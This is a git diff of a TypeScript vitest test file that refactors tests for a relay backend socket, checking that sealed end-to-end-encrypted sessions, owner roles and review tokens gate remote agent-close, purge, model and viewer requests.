@@ -1,12 +1,26 @@
 import * as gitPullRequest from './lib/gitPullRequest.js'
 import * as sessionGitPullRequest from './lib/sessionGitPullRequest.js'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
-import { readFileSync, mkdirSync, mkdtempSync, writeFileSync, rmSync } from 'fs'
+import { existsSync, readFileSync, mkdirSync, mkdtempSync, writeFileSync, rmSync } from 'fs'
 import { homedir, tmpdir } from 'os'
 import { join } from 'path'
 import { fileURLToPath } from 'url'
-import { AGENT_OPENED_THROTTLE_MS, BackendSocket, compactRuntimePickerModels, deviceAgentListItem, deviceAgentRow, grokHistoryPage } from './backendSocket.js'
-import { ServiceUnavailableError } from './core/serviceHost.js'
+import { BackendSocket } from './backendSocket.js'
+import { dispatchDown, gatewayOf, relaySocket, upstreamOf } from './testing/relaySocket.js'
+import { AGENT_OPENED_THROTTLE_MS } from './core/agents/update.js'
+import { deviceAgentListItem, deviceAgentRow } from './core/agents/list.js'
+import { grokHistoryPage } from './core/transcripts/history.js'
+import { bindAgentList, bindAgentUpdate, bindCancelRequest, bindLaunchRequests, bindCloseRequests, bindMessageRequest, bindPurgeRequest, bindQuestionResponse, bindStopRequest, bindTerminalRequests } from './testing/socketCore.js'
+import { emptyPorts, MODELS_FALLBACKS, MODELS_OFF, MONITOR_FALLBACKS, type ModelsPort } from './core/api.js'
+import { createServiceHost, ServiceUnavailableError } from './core/serviceHost.js'
+import { MODELS_REQUESTS, startModels } from './services/models.js'
+import { SHELL_REQUESTS, startShell } from './services/shell.js'
+import { USAGE_REQUESTS, startUsage } from './services/usage.js'
+import { MONITOR_REQUESTS, startMonitor, type MonitorDeps } from './services/monitor.js'
+import { PROJECTS_REQUESTS, startProjects } from './services/projects.js'
+import { createHarnessResourcesReader } from './lib/harnessResources.js'
+import { createHarnessStorageReader } from './lib/harnessTelemetry.js'
+import { fakeCore } from './testing/fakeCore.js'
 import { AuthSessionError, type AuthSessionManager } from './lib/authSession.js'
 import { WS_IDLE_DEADLINE_MS as IDLE_DEADLINE_MS } from './lib/wsLiveness.js'
 import { TerminalStreamManager } from './lib/terminalStreamManager.js'
@@ -23,27 +37,27 @@ import * as machineResources from './lib/machineResources.js'
 import * as projectFolder from './lib/projectFolder.js'
 import * as claudeTrust from './lib/claudeTrust.js'
 import * as projectPreview from './lib/projectPreview.js'
-import * as storeCatalog from './dsh/catalog.js'
 import * as opencodeVersion from './engines/opencode/version.js'
 import { randomUUID } from 'node:crypto'
 import { fakeGridAnswers, installFakeGrid, type FakeGrid } from './lib/__fixtures__/fakeGrid.js'
 import { clearGridMcpUrlCache } from './lib/gridMcpUrl.js'
 import { LocalModels } from './lib/localModels.js'
-import type { GridAttachResult } from './lib/gridAttach.js'
-import { STRICT_DOWN_TYPES, encryptDownFrame, encryptRpcResult } from './lib/e2ee/applicationFrames.js'
+import { STRICT_DOWN_TYPES, encryptDownFrame, encryptDownFrameFor, encryptRpcResult } from './lib/e2ee/applicationFrames.js'
 import { CloseAgentService } from './lib/closeAgentService.js'
+import { env } from './config/env.js'
 
 describe('safe session close RPC', () => {
   it('seals cleanup previews and passes the open-tab condition to Close', async () => {
-    const socket = new BackendSocket('fixture'), frames: any[] = []
+    const socket = relaySocket('fixture'), frames: any[] = []
     socket.registerLocalClient('local:cleanup', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
-    socket.cleanupPreview = vi.fn(async () => ({ version: 1, agents: [], kept: 2 }))
+    const cleanupPreview = vi.fn(async () => ({ version: 1, agents: [], kept: 2 }))
+    bindCloseRequests(socket, cleanupPreview)
     const request = vi.fn(async () => ({ error: 'SESSION_IN_TAB' }))
     socket.closeAgentService = { request, dispose() {} } as unknown as CloseAgentService
     expect(encryptDownFrame('agents_cleanup_preview')).toBe(true)
     expect(encryptRpcResult('agents_cleanup_preview_result')).toBe(true)
-    await (socket as any).dispatchDown({ type: 'agents_cleanup_preview', payload: { requestId: 'unsealed' } }, 'remote')
-    expect(socket.cleanupPreview).not.toHaveBeenCalled()
+    await dispatchDown(socket, { type: 'agents_cleanup_preview', payload: { requestId: 'unsealed' } }, 'remote')
+    expect(cleanupPreview).not.toHaveBeenCalled()
     socket.handleLocalFrame('local:cleanup', { type: 'agents_cleanup_preview', payload: { requestId: 'preview' } })
     const target = { agentId: 'a', sessionId: 's', createdAt: '2026-10-01T00:00:00.000Z', mode: 'now', onlyIfHidden: true }
     socket.handleLocalFrame('local:cleanup', { type: 'agent_close', payload: { ...target, requestId: 'close' } })
@@ -58,7 +72,7 @@ describe('safe session close RPC', () => {
     { activity: 'idle', sessionId: '' },
     { activity: 'working', sessionId: '' },
   ] as const)('uses $activity activity for session "$sessionId" even with another live viewer', async ({ activity, sessionId }) => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
     const frames: any[] = []
     for (const connId of ['local:close', 'local:other']) {
       socket.registerLocalClient(connId, {
@@ -78,6 +92,7 @@ describe('safe session close RPC', () => {
     socket.closeAgentService = new CloseAgentService({
       registry, activity: async () => activity, checkpoint, stop, changed: () => {},
     })
+    bindCloseRequests(socket)
     const terminals = new TerminalStreamManager({
       terminals: {
         openStream: async () => ({ state: 'succeeded', value: {
@@ -122,16 +137,18 @@ describe('safe session close RPC', () => {
   })
 
   it('requires encrypted remote frames and never blocks unrelated inventory while saving', async () => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
+    bindAgentList(socket)
     const frames: any[] = []
     socket.registerLocalClient('local:close', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     let finish!: (value: { closed: true }) => void
     const request = vi.fn(() => new Promise<{ closed: true }>(resolve => { finish = resolve }))
     socket.closeAgentService = { request, dispose() {} } as unknown as CloseAgentService
+    bindCloseRequests(socket)
     const payload = { requestId: 'closing', agentId: 'fixture', sessionId: 'history', createdAt: '2026-09-30T12:00:00.000Z', mode: 'idle' }
     expect(encryptDownFrame('agent_close')).toBe(true)
     expect(encryptRpcResult('agent_close_result')).toBe(true)
-    await (socket as any).dispatchDown({ type: 'agent_close', payload }, 'remote')
+    await dispatchDown(socket, { type: 'agent_close', payload }, 'remote')
     expect(request).not.toHaveBeenCalled()
     socket.handleLocalFrame('local:close', { type: 'agent_close', payload })
     socket.handleLocalFrame('local:close', { type: 'agents_list', payload: { requestId: 'inventory' } })
@@ -145,41 +162,67 @@ describe('safe session close RPC', () => {
 
 describe('reviewed permanent deletion RPCs', () => {
   afterEach(() => vi.restoreAllMocks())
+  it('tells a relayed client whose sealed frame finds no session that its session is gone, and only then', async () => {
+    const socket = relaySocket('fixture')
+    const internals = socket as any
+    const sent = () => upstreamOf(socket).queue.map((item: { msg: unknown }) => item.msg)
+    const sealed = { type: 'message', payload: { __e2e: { v: 1, k: 'p', n: 3, ct: 'fixture' } } }
+    await dispatchDown(socket, sealed, 'web:gone')
+    expect(sent()).toContainEqual({ t: 'up', targetConnId: 'web:gone', frame: { type: 'e2e_session_unknown', payload: { refused: { type: 'message', n: 3 } } } })
+    // A frame that does not open on a live session is dropped without a word.
+    const before = sent().length
+    vi.spyOn(gatewayOf(socket).e2ee, 'sessionGone').mockReturnValue(null)
+    await dispatchDown(socket, sealed, 'web:live')
+    expect(sent()).toHaveLength(before)
+  })
+
+  it('tells a relayed client whose terminal bytes find no session that its session is gone', async () => {
+    const socket = relaySocket('fixture')
+    const internals = socket as any
+    const { sealTerminalBinary } = await import('./lib/e2ee/terminalSeal.js')
+    const raw = sealTerminalBinary(new Uint8Array(32).fill(7), 9, { kind: 1, streamId: '00112233-4455-6677-8899-aabbccddeeff', seq: 1, bytes: new TextEncoder().encode('ls\r'), compressed: false })!
+    const gateway = gatewayOf(socket) as any
+    gateway.enqueueTerminalBinary('web:gone', raw)
+    await gateway.downChains.get('web:gone')
+    expect(upstreamOf(socket).queue.map((item: { msg: unknown }) => item.msg)).toContainEqual({ t: 'up', targetConnId: 'web:gone', frame: { type: 'e2e_session_unknown', payload: { refused: { type: 'terminal_binary', kind: 1, n: 9 } } } })
+  })
+
   it.each(['agent_purge', 'agent_worktree_delete'])('%s requires an owner, explicit identity and a review token', async type => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
     const internals = socket as any, frames: any[] = []
     socket.registerLocalClient('local:purge', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     const request = vi.fn(async () => ({ reviewId: 'review', sessionBytes: 4096 }))
     socket.purgeAgentService = { busy: () => false, request, worktreeRequest: request } as unknown as PurgeAgentService
+    bindPurgeRequest(socket)
     const payload = { requestId: 'delete', agentId: 'selected', sessionId: 'history', createdAt: 1234, mode: 'inspect' }
     expect(encryptDownFrame(type)).toBe(true)
     expect(encryptRpcResult(type + '_result')).toBe(true)
-    await internals.dispatchDown({ type, payload }, 'remote')
+    await dispatchDown(socket, { type, payload }, 'remote')
     expect(request).not.toHaveBeenCalled()
-    const role = vi.spyOn(internals.e2ee, 'sessionRole').mockReturnValue('device')
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue({ type, payload })
-    vi.spyOn(internals.e2ee, 'wrapRpcReply').mockReturnValue({ type: type + '_result', payload: { __e2e: 'sealed' } })
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('device')
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type, payload })
+    vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: type + '_result', payload: { __e2e: 'sealed' } })
     const sealed = { type, payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).not.toHaveBeenCalled()
     role.mockReturnValue('web')
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).toHaveBeenCalledOnce()
     request.mockClear()
     for (const invalid of [{ ...payload, sessionId: undefined }, { ...payload, createdAt: '1234' }, { ...payload, mode: 'delete' }]) {
-      await internals.dispatchDown({ type, payload: invalid }, 'local:purge', 'local')
+      await dispatchDown(socket, { type, payload: invalid }, 'local:purge', 'local')
     }
     expect(request).not.toHaveBeenCalled()
     expect(frames.filter(f => f.payload.error === 'INVALID_DELETE_REQUEST')).toHaveLength(3)
-    await internals.dispatchDown({ type, payload: { ...payload, mode: 'delete', reviewId: 'review', path: '/reviewed', discardChanges: true } }, 'local:purge', 'local')
+    await dispatchDown(socket, { type, payload: { ...payload, mode: 'delete', reviewId: 'review', path: '/reviewed', discardChanges: true } }, 'local:purge', 'local')
     expect(request).toHaveBeenCalledWith(expect.objectContaining({ reviewId: 'review', path: '/reviewed', discardChanges: true }))
     request.mockClear()
-    await internals.dispatchDown({ type, payload: { ...payload, mode: 'describe' } }, 'local:purge', 'local')
+    await dispatchDown(socket, { type, payload: { ...payload, mode: 'describe' } }, 'local:purge', 'local')
     expect(request).toHaveBeenCalledTimes(type === 'agent_worktree_delete' ? 1 : 0)
     request.mockClear()
-    await internals.dispatchDown({ type, payload: { ...payload, mode: 'delete', reviewId: 'review', choices: { sessionData: false, worktreeData: 'yes' } } }, 'local:purge', 'local')
+    await dispatchDown(socket, { type, payload: { ...payload, mode: 'delete', reviewId: 'review', choices: { sessionData: false, worktreeData: 'yes' } } }, 'local:purge', 'local')
     expect(request).not.toHaveBeenCalled()
-    await internals.dispatchDown({ type, payload: { ...payload, includeWorktree: true, choices: { sessionData: false, worktreeData: true } } }, 'local:purge', 'local')
+    await dispatchDown(socket, { type, payload: { ...payload, includeWorktree: true, choices: { sessionData: false, worktreeData: true } } }, 'local:purge', 'local')
     expect(request).toHaveBeenCalledWith(expect.objectContaining({ includeWorktree: true, choices: { sessionData: false, worktreeData: true } }))
     await socket.stop()
   })
@@ -187,24 +230,11 @@ describe('reviewed permanent deletion RPCs', () => {
 
 describe('local model lifecycle RPCs', () => {
   afterEach(() => vi.restoreAllMocks())
-  it.each(['grid_fleet_models_list', 'grid_fleet_model_download', 'grid_fleet_model_start', 'grid_fleet_model_stop'])('dispatches %s and returns its correlated result', async type => {
-    const socket = new BackendSocket('fixture')
-    socket.setHarnessGridName('home')
-    const frames: any[] = []
-    socket.registerLocalClient('local:models', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
-    const list = vi.spyOn(LocalModels.prototype, 'list').mockResolvedValue({ models: [], busy: false, observedAt: 'fixture' })
-    const act = vi.spyOn(LocalModels.prototype, 'act').mockResolvedValue({ error: 'fixture refusal' })
-    socket.handleLocalFrame('local:models', { type, payload: { requestId: 'models-rpc', modelId: 'fixture/model', refresh: true } })
-    await vi.waitFor(() => expect(frames.some(frame => frame.type === `${type}_result`)).toBe(true))
-    expect(frames.find(frame => frame.type === `${type}_result`).payload.requestId).toBe('models-rpc')
-    if (type === 'grid_fleet_models_list') expect(list).toHaveBeenCalledWith('home', true)
-    else expect(act).toHaveBeenCalledWith('home', 'fixture/model', type.endsWith('download') ? 'download' : type.endsWith('start') ? 'start' : 'stop')
-    await socket.stop()
-  })
-
   it('a slow catalog never blocks terminal or agent inventory, and errors stay redacted', async () => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
+    bindAgentList(socket)
     socket.setHarnessGridName('home')
+    serveModels(socket)
     const frames: any[] = []
     socket.registerLocalClient('local:models', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     let reject!: (cause: Error) => void
@@ -221,11 +251,14 @@ describe('local model lifecycle RPCs', () => {
   })
 
   it('rejects unencrypted remote lifecycle requests before reaching the model service', async () => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
+    const models = serveModels(socket)
+    const routed = vi.spyOn(models, 'route')
     const act = vi.spyOn(LocalModels.prototype, 'act')
     for (const type of ['grid_fleet_model_download', 'grid_fleet_model_start', 'grid_fleet_model_stop']) {
-      await (socket as any).dispatchDown({ type, payload: { requestId: 'unsafe', modelId: 'fixture/model' } }, 'remote')
+      await dispatchDown(socket, { type, payload: { requestId: 'unsafe', modelId: 'fixture/model' } }, 'remote')
     }
+    expect(routed).not.toHaveBeenCalled()
     expect(act).not.toHaveBeenCalled()
     await socket.stop()
   })
@@ -233,13 +266,13 @@ describe('local model lifecycle RPCs', () => {
 
 describe('confirmed harness pause replies', () => {
   it.each(['unsupported', 'unconfirmed', 'confirmed'] as const)('%s stop never sends a false success', async state => {
-    const socket = new BackendSocket('fixture')
+    const socket = relaySocket('fixture')
     const frames: any[] = []
     socket.registerLocalClient('local:pause', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
-    if (state !== 'unsupported') socket.onDeleteAgent = async () => {
+    if (state !== 'unsupported') bindStopRequest(socket, async () => {
       if (state === 'unconfirmed') throw new AgentStopError('The process could not be verified.')
-    }
-    await (socket as any).dispatchDown({ type: 'agent_delete', payload: { requestId: 'pause', agentId: 'fixture' } }, 'local:pause')
+    })
+    await dispatchDown(socket, { type: 'agent_delete', payload: { requestId: 'pause', agentId: 'fixture' } }, 'local:pause')
     const reply = frames.find(frame => frame.type === 'agent_delete_result')?.payload
     expect(reply).toMatchObject(state === 'confirmed' ? { deleted: true } : {
       error: state === 'unsupported' ? 'UNSUPPORTED' : 'STOP_UNCONFIRMED',
@@ -266,7 +299,8 @@ describe('agent_update opened: one "last used" for every app', () => {
     // Only the clock: the dispatch queue and vi.waitFor still run on real timers.
     vi.useFakeTimers({ toFake: ['Date'] })
     vi.setSystemTime(OPENED)
-    socket = new BackendSocket('fixture')
+    socket = relaySocket('fixture')
+    bindAgentUpdate(socket)
     frames = []
     socket.registerLocalClient('local:opened', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     agentId = registry.openPendingAgent({ engine: 'claude', runtimes: [{ backend: 'tmux', paneId: '%7301' }], cwd: '/tmp/opened' })!.agentId
@@ -282,7 +316,7 @@ describe('agent_update opened: one "last used" for every app', () => {
   const replyTo = (requestId: string) => frames.find(frame => frame.type === 'agent_update_result' && frame.payload.requestId === requestId)?.payload
   /** What `handleLocalFrame` queues for a window on this computer, awaited so the clock stays put. */
   async function update(payload: Record<string, unknown>, requestId: string): Promise<any> {
-    await (socket as any).dispatchDown({ type: 'agent_update', payload: { requestId, ...payload } }, 'local:opened', 'local')
+    await dispatchDown(socket, { type: 'agent_update', payload: { requestId, ...payload } }, 'local:opened', 'local')
     return replyTo(requestId)
   }
   const pushes = () => frames.filter(frame => frame.type === 'agent_synced')
@@ -345,10 +379,10 @@ describe('agent_update opened: one "last used" for every app', () => {
   it('takes the open from a sealed remote session too — the phone, or another computer’s desktop via its relay', async () => {
     const internals = socket as any
     const clear = { type: 'agent_update', payload: { requestId: 'remote-1', agentId, opened: true } }
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue(clear)
-    vi.spyOn(internals.e2ee, 'hasSession').mockReturnValue(true)
-    const sealedReply = vi.spyOn(internals.e2ee, 'wrapRpcReply').mockReturnValue({ type: 'agent_update_result', payload: { __e2e: 'sealed' } })
-    await internals.dispatchDown({ type: 'agent_update', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }, 'remote-conn')
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(clear)
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const sealedReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: 'agent_update_result', payload: { __e2e: 'sealed' } })
+    await dispatchDown(socket, { type: 'agent_update', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }, 'remote-conn')
     expect(sealedReply).toHaveBeenCalledWith('remote-conn', 'agent_update_result', 'remote-1',
       expect.objectContaining({ agent: expect.objectContaining({ id: agentId, lastOpenedAt: iso(OPENED) }) }))
     // ...and this computer's own window hears the new order like everyone else.
@@ -356,82 +390,142 @@ describe('agent_update opened: one "last used" for every app', () => {
   })
 
   it('refuses an unsealed remote open like any other agent_update', async () => {
-    await (socket as any).dispatchDown({ type: 'agent_update', payload: { requestId: 'plain', agentId, opened: true } }, 'remote-conn')
+    await dispatchDown(socket, { type: 'agent_update', payload: { requestId: 'plain', agentId, opened: true } }, 'remote-conn')
     expect(registry.byAgent(agentId)?.lastOpenedAt).toBeUndefined()
     expect(pushes()).toHaveLength(0)
   })
 })
 
 describe('viewer forwarding authentication', () => {
-  it.each(['command_bar', 'route_task', 'route_send'])('requires a sealed owner session for %s', async type => {
-    const socket = new BackendSocket('token'), internals = socket as any
+  it('routes a sealed command_bar to the command bar with its connection, who asked, and nothing in the clear', async () => {
+    const socket = relaySocket('token')
+    const routed: Array<{ type: string; asker: unknown }> = []
+    socket.serviceRouter = (type, _payload, asker, reply) => { routed.push({ type, asker }); reply({ selectedId: null }); return true }
+    const ownerCommands = vi.spyOn(socket.ownerCommands, 'request')
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('web')
+    const clear = { type: 'command_bar', payload: { requestId: 'one', request: { prompt: 'fixture', candidates: [] } } }
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(clear)
+    const sealedReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: 'command_bar_result', payload: { __e2e: 'sealed' } })
+    await dispatchDown(socket, clear, 'remote')
+    expect(routed).toEqual([])
+    const sealed = { type: 'command_bar', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }
+    // A device's session asks as no owner: the command bar refuses it (services/commandBar.ts).
+    role.mockReturnValue('device')
+    await dispatchDown(socket, sealed, 'remote')
+    role.mockReturnValue('web')
+    await dispatchDown(socket, sealed, 'remote')
+    expect(routed).toEqual([
+      { type: 'command_bar', asker: { local: false, owner: false, connection: 'remote', requestId: 'one' } },
+      { type: 'command_bar', asker: { local: false, owner: true, connection: 'remote', requestId: 'one' } },
+    ])
+    expect(ownerCommands).not.toHaveBeenCalled()
+    expect(sealedReply).toHaveBeenCalledWith('remote', 'command_bar_result', 'one', { selectedId: null })
+    await socket.stop()
+  })
+
+  it.each(['route_task', 'route_send'])('requires a sealed owner session for %s', async type => {
+    const socket = relaySocket('token'), internals = socket as any
     const request = vi.spyOn(socket.ownerCommands, 'request').mockResolvedValue({ ok: true })
-    vi.spyOn(internals.e2ee, 'hasSession').mockReturnValue(true)
-    const role = vi.spyOn(internals.e2ee, 'sessionRole').mockReturnValue('web')
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('web')
     const clear = { type, payload: { requestId: 'one', text: 'fixture task' } }
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue(clear)
-    const sealedReply = vi.spyOn(internals.e2ee, 'wrapRpcReply').mockReturnValue({ type: `${type}_result`, payload: { __e2e: 'sealed' } })
-    await internals.dispatchDown(clear, 'remote')
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(clear)
+    const sealedReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: `${type}_result`, payload: { __e2e: 'sealed' } })
+    await dispatchDown(socket, clear, 'remote')
     expect(request).not.toHaveBeenCalled()
     const sealed = { type, payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }
     role.mockReturnValue('device')
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).not.toHaveBeenCalled()
     role.mockReturnValue('web')
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).toHaveBeenCalledWith('remote', type, clear.payload)
     expect(sealedReply).toHaveBeenCalledWith('remote', `${type}_result`, 'one', { ok: true })
     await socket.stop()
   })
 
   it('allows interactive viewers only on a sealed owner web connection or trusted loopback', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const internals = socket as any
-    const request = vi.spyOn(socket.interactiveViewers, 'request').mockResolvedValue({ data: 'jpeg' })
-    vi.spyOn(internals.e2ee, 'hasSession').mockReturnValue(true)
-    const role = vi.spyOn(internals.e2ee, 'sessionRole').mockReturnValue('web')
+    const request = vi.fn(async () => ({ data: 'jpeg' }))
+    socket.viewerStreams = { frame: vi.fn(), surface: request, closed: vi.fn(), closedAll: vi.fn() }
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('web')
     const clear = { type: 'viewer_surface', payload: { requestId: 'one', surfaceId: 'surface', agentId: 'a', op: 'frame' } }
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue(clear)
-    const reply = vi.spyOn(internals.e2ee, 'wrapRpcReply').mockReturnValue({ type: 'viewer_surface_result', payload: { __e2e: 'sealed' } })
-    await internals.dispatchDown(clear, 'remote')
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(clear)
+    const reply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: 'viewer_surface_result', payload: { __e2e: 'sealed' } })
+    await dispatchDown(socket, clear, 'remote')
     expect(request).not.toHaveBeenCalled()
     const sealed = { type: 'viewer_surface', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }
     role.mockReturnValue('device')
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).not.toHaveBeenCalled()
     role.mockReturnValue('web')
-    await internals.dispatchDown(sealed, 'remote')
+    await dispatchDown(socket, sealed, 'remote')
     expect(request).toHaveBeenCalledWith('remote', clear.payload)
     expect(reply).toHaveBeenCalledWith('remote', 'viewer_surface_result', 'one', { data: 'jpeg' })
     socket.registerLocalClient('local:viewer', { sendFrame: () => true, sendBinary: () => true })
-    await internals.dispatchDown(clear, 'local:viewer')
+    await dispatchDown(socket, clear, 'local:viewer')
     expect(request).toHaveBeenCalledWith('local:viewer', clear.payload)
+    // With nothing to render it, the surface is answered unavailable rather than left unanswered.
+    const local = vi.fn(() => true)
+    socket.registerLocalClient('local:none', { sendFrame: local, sendBinary: () => true })
+    socket.viewerStreams = null
+    await dispatchDown(socket, { ...clear, payload: { ...clear.payload, requestId: 'two' } }, 'local:none')
+    await vi.waitFor(() => expect(local).toHaveBeenCalledWith({ type: 'viewer_surface_result', payload: { requestId: 'two', error: 'VIEWER_UNAVAILABLE' } }))
     await socket.unregisterLocalClient('local:viewer')
     await socket.stop()
   })
 
+  it('hands a viewer stream\'s answers to the one connection that opened it, and ends its streams as connections go', async () => {
+    const socket = relaySocket('token')
+    const streams = { frame: vi.fn(), surface: vi.fn(), closed: vi.fn(), closedAll: vi.fn() }
+    socket.viewerStreams = streams
+    const local = vi.fn(() => true)
+    socket.registerLocalClient('local:viewer', { sendFrame: local, sendBinary: () => true })
+    expect(socket.sendViewerFrame('local:viewer', 'viewer_response', { streamId: 's1', status: 200 })).toBe(true)
+    expect(local).toHaveBeenCalledWith({ type: 'viewer_response', payload: { streamId: 's1', status: 200 } })
+    // A remote connection's go through the gateway, which says whether it could take them.
+    const target = vi.spyOn(gatewayOf(socket), 'target').mockReturnValue(false)
+    expect(socket.sendViewerFrame('remote', 'viewer_data', { streamId: 's1', data: 'AA==' })).toBe(false)
+    expect(target).toHaveBeenCalledWith('remote', 'viewer_data', { streamId: 's1', data: 'AA==' })
+    await socket.unregisterLocalClient('local:viewer')
+    expect(streams.closed).toHaveBeenCalledWith('local:viewer')
+    socket.fromGateway.client('r1', { role: 'web', label: null, identity: 'PUB', direct: false })
+    socket.fromGateway.client('r1', null)
+    expect(streams.closed).toHaveBeenCalledWith('r1')
+    await socket.fromGateway.disconnected('r2')
+    expect(streams.closed).toHaveBeenCalledWith('r2')
+    socket.fromGateway.linkDown()
+    expect(streams.closedAll).toHaveBeenCalledTimes(1)
+    await socket.stop()
+    expect(streams.closedAll).toHaveBeenCalledTimes(2)
+  })
+
   it('requires encryption and a web-role session remotely, while permitting trusted local clients', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const internals = socket as any
-    const handle = vi.spyOn(socket.viewerForwarder, 'handle').mockImplementation(() => {})
-    const role = vi.spyOn(internals.e2ee, 'sessionRole').mockReturnValue('web')
+    const handle = vi.fn()
+    socket.viewerStreams = { frame: handle, surface: vi.fn(), closed: vi.fn(), closedAll: vi.fn() }
+    const role = vi.spyOn(gatewayOf(socket).e2ee, 'sessionRole').mockReturnValue('web')
     const frame = { type: 'viewer_request', payload: { streamId: 'v', agentId: 'a' } }
-    const unwrap = vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue(frame)
-    await internals.dispatchDown(frame, 'remote')
+    const unwrap = vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue(frame)
+    await dispatchDown(socket, frame, 'remote')
     expect(unwrap).not.toHaveBeenCalled()
     expect(handle).not.toHaveBeenCalled()
     const encrypted = { type: 'viewer_request', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }
     role.mockReturnValue('device')
-    await internals.dispatchDown(encrypted, 'remote')
+    await dispatchDown(socket, encrypted, 'remote')
     expect(handle).not.toHaveBeenCalled()
     role.mockReturnValue('web')
-    await internals.dispatchDown(encrypted, 'remote')
+    await dispatchDown(socket, encrypted, 'remote')
     expect(handle).toHaveBeenCalledWith('remote', 'viewer_request', frame.payload)
     socket.registerLocalClient('local:viewer', { sendFrame: () => true, sendBinary: () => true })
-    await internals.dispatchDown(frame, 'local:viewer')
+    await dispatchDown(socket, frame, 'local:viewer')
     expect(handle).toHaveBeenCalledWith('local:viewer', 'viewer_request', frame.payload)
     handle.mockClear()
-    await internals.dispatchDown({ type: 'viewer_arbitrary', payload: {} }, 'local:viewer')
+    await dispatchDown(socket, { type: 'viewer_arbitrary', payload: {} }, 'local:viewer')
     expect(handle).not.toHaveBeenCalled()
     await socket.unregisterLocalClient('local:viewer')
     await socket.stop()
@@ -533,6 +627,12 @@ const wsMock = vi.hoisted(() => {
 })
 
 vi.mock('ws', () => ({ WebSocket: wsMock.MockWebSocket }))
+// Grid's set-up, which the models service asks for before a move onto a grid model: set up already here,
+// as on a machine that has used grid before. Never a real install or sign-in from a spec.
+vi.mock('./lib/gridAttach.js', async (real) => ({
+  ...await real<object>(),
+  createGridAccess: () => ({ ensure: async () => ({ status: 'converged', name: null, detail: 'set up already' }) }),
+}))
 // Never the person's real ~/.claude.json or ~/.codex/config.toml: creating an agent records folder trust,
 // and an unmocked run of these specs used to write test paths into the developer's own config.
 vi.mock('./lib/claudeTrust.js', () => ({
@@ -547,11 +647,63 @@ function parseSent(ws: InstanceType<typeof wsMock.MockWebSocket>): Array<Record<
 /** A relay down-frame as a paired client sends it: sealed. The socket's E2EE session is stubbed to open
  *  it back to `payload`, so the test exercises the RPC rather than the crypto (core.test.ts does that). */
 function sealedDown(socket: BackendSocket, connId: string, type: string, payload: Record<string, unknown>) {
-  const e2ee = (socket as any).e2ee
+  const e2ee = gatewayOf(socket).e2ee
   if (!vi.isMockFunction(e2ee.unwrapDown)) {
     vi.spyOn(e2ee, 'unwrapDown').mockImplementation((_connId: unknown, f: any) => ({ ...f, payload: f.payload.__e2e.clear }))
   }
   return { t: 'down', connId, frame: { type, payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture', clear: payload } } } }
+}
+
+/** The models service (services/models.ts) answering the socket's models requests through a service host,
